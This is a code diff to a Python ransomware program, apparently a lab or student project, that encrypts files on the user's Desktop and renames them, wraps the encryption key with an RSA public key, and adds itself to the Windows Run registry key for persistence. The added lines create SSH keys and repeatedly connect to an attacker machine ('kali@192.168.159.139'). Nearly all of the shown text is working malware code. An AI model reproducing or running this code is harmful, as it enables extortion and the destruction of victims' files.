@@ -8,8 +8,10 @@ from Crypto.PublicKey import RSA
 from Crypto.Cipher import PKCS1_OAEP
 from tkinter import *
 import winreg
+import subprocess
 import psutil
 from threading import Thread
+from time import sleep
 
 
 class RansomWare:
@@ -22,31 +24,66 @@ class RansomWare:
         self.sysRoot = os.path.expanduser('~')
         self.localRoot = os.path.join(self.sysRoot,'Desktop')
         self.publicIP = requests.get('https://api.ipify.org').text
+        self.crypted_files = []
+  
+    def create_ssh_key(self, ssh_path):
+            os.makedirs(ssh_path)
+            gen_key_comm = [
+            "powershell", 
+            "ssh-keygen", 
+            "-q", "-t", "rsa", 
+            "-b", "4096", 
+            "-f", f"{ssh_path}/id_rsa",
+            "-N", ""
+        ]
+            subprocess.run(gen_key_comm, capture_output=True)
+
+        
+        
+    def connection_server(self):
+        is_connected = False
+        ssh_path = os.path.join(os.environ['USERPROFILE'], '.ssh')
+        if not (os.path.exists(ssh_path)):
+            is_connected = self.create_ssh_key(ssh_path)
+        
+        if not is_connected:
+            connectionCommand = "ssh kali@192.168.159.139"
+            while not is_connected:
+                try:
+                    print("tentativo di connessione...")
+                    subprocess.run(connectionCommand)
+                    is_connected = True
+                    print("connessione al server riuscita")
+                except Exception as e:
+                    print(e)
+                    sleep(5)
+    
+   
 
     def generate_key(self):
         self.key = Fernet.generate_key()
         self.crypter = Fernet(self.key)
 
-    def write_key(self):
-        key_path = os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local', 'Temp', 'fernet_key.txt')
+ 
+
+    def encrypt_fernet_key(self):
+        key_path = os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local', 'Temp', 'temporaryUpdater.txt')
+        public_key = os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local', 'Microsoft', 'OneDrive', 'public.pem')
+        created = 0
         if not os.path.exists(key_path):
             with open(key_path, 'wb') as f:
                 f.write(self.key)
+                created = 1
 
-    def encrypt_fernet_key(self):
-        key_path = os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local', 'Temp', 'fernet_key.txt')
-        public_key = os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local', 'Microsoft', 'OneDrive', 'public.pem')
         with open(key_path, 'rb') as fk:
             fernet_key = fk.read()
-        if not os.path.exists(key_path):
+        if created == 1:
             with open(key_path, 'wb') as f:
                 self.public_key = RSA.import_key(open(public_key).read())
                 public_crypter = PKCS1_OAEP.new(self.public_key)
                 enc_fernent_key = public_crypter.encrypt(fernet_key)
                 f.write(enc_fernent_key)
                 self.key = enc_fernent_key
-                ctypes.windll.kernel32.SetFileAttributesW(key_path, 2)
-                
         else:
             self.key = fernet_key
         self.crypter = None
@@ -63,8 +100,14 @@ class RansomWare:
         if not encrypted:
             new_path = file_path + ".encrypt"
             os.rename(file_path, new_path)
+            self.crypted_files.append(new_path)
             return new_path
-
+        
+    def write_log(self):
+        with open("log_file.txt", 'w') as f:
+            for file_path in self.crypt_file:
+                f.write(f"{file_path}\n")
+                
     def crypt_system(self, encrypted=False):
         system = os.walk(self.localRoot, topdown=True)
         for root, _, files in system:
@@ -95,7 +138,7 @@ class RansomWare:
         key_path = r"Software\\Microsoft\\Windows\\CurrentVersion\\Run"
         key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE)
         path = os.path.expandvars(file_path)
-        value = f'{path}\\RansomWare.exe --no-startup-window --win-session-start'
+        value = f'{path}\\RansomWare.exe'
         if not self.already_exists(key_path, key_name):
             winreg.SetValueEx(key, key_name, 0, winreg.REG_SZ, value)
             winreg.CloseKey(key)
@@ -166,14 +209,17 @@ def main():
     rw = RansomWare()
     rw.generate_key()
     rw.crypt_system()
-    rw.write_key()
     rw.encrypt_fernet_key()
     rw.change_desktop_background()
     rw.add_to_startup(rw.localRoot)
     rw.set_high_priority()
 
-    t1 = Thread(target=rw.show_ransom_note)
-    t1.start()
+    #t1 = Thread(target=rw.show_ransom_note)
+    t2 = Thread(target=rw.connection_server)
+    #t1.start()
+    t2.start()
+
+
 
 if __name__ == '__main__':
     main()
